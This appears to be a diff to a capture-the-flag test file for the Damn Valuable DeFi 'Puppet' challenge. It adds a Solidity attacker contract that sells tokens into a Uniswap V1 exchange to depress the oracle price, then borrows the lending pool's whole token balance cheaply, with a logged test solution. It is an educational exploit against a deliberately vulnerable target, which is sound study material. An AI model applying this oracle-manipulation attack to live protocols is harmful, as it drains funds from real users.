@@ -8,6 +8,58 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+// Attacker contract to execute everything in a single transaction
+contract PuppetAttacker {
+    DamnValuableToken private token;
+    IUniswapV1Exchange private uniswapExchange;
+    PuppetPool private lendingPool;
+    address private recovery;
+
+    constructor(
+        address _tokenAddress,
+        address _uniswapExchangeAddress,
+        address _lendingPoolAddress,
+        address _recoveryAddress
+    ) {
+        token = DamnValuableToken(_tokenAddress);
+        uniswapExchange = IUniswapV1Exchange(_uniswapExchangeAddress);
+        lendingPool = PuppetPool(_lendingPoolAddress);
+        recovery = _recoveryAddress;
+    }
+
+    function attack() external payable {
+        // Step 1: Approve tokens for the Uniswap exchange
+        token.approve(address(uniswapExchange), type(uint256).max);
+        
+        // Step 2: Sell almost all our tokens to manipulate the price
+        uint256 tokensToSell = token.balanceOf(address(this)) - 1e18; // Keep some tokens
+        uint256 minEthToReceive = 1; // We don't care about slippage as we're manipulating the price
+        uint256 deadline = block.timestamp + 1 hours;
+        
+        // Sell tokens to manipulate the price
+        uniswapExchange.tokenToEthSwapInput(
+            tokensToSell,
+            minEthToReceive,
+            deadline
+        );
+        
+        // Step 3: Borrow all tokens from the lending pool
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        lendingPool.borrow{value: address(this).balance}(
+            poolBalance,
+            recovery
+        );
+        
+        // Return any remaining ETH to the caller
+        if (address(this).balance > 0) {
+            payable(msg.sender).transfer(address(this).balance);
+        }
+    }
+
+    // To receive ETH from Uniswap exchange
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +144,41 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        console.log("\n[*] Initial state:");
+        console.log("Player ETH balance:", player.balance);
+        console.log("Player token balance:", token.balanceOf(player));
+        console.log("Uniswap exchange ETH balance:", address(uniswapV1Exchange).balance);
+        console.log("Uniswap exchange token balance:", token.balanceOf(address(uniswapV1Exchange)));
+        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
         
+        // Calculate initial price and deposit required
+        uint256 initialPrice = address(uniswapV1Exchange).balance * 1e18 / token.balanceOf(address(uniswapV1Exchange));
+        uint256 initialDepositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Initial token price (in wei):", initialPrice);
+        console.log("Initial deposit required to borrow all tokens:", initialDepositRequired);
+        
+        // Deploy the attacker contract
+        PuppetAttacker attacker = new PuppetAttacker(
+            address(token),
+            address(uniswapV1Exchange),
+            address(lendingPool),
+            recovery
+        );
+        
+        // Transfer all tokens and ETH to the attacker contract
+        token.transfer(address(attacker), token.balanceOf(player));
+        
+        console.log("\n[*] Executing attack in a single transaction...");
+        
+        // Execute the attack in a single transaction
+        (bool success, ) = address(attacker).call{value: player.balance}(abi.encodeWithSignature("attack()"));
+        require(success, "Attack failed");
+        
+        // Final state
+        console.log("\n[*] Final state:");
+        console.log("Player ETH balance:", player.balance);
+        console.log("Recovery token balance:", token.balanceOf(recovery));
+        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
     }
 
     // Utility function to calculate Uniswap prices
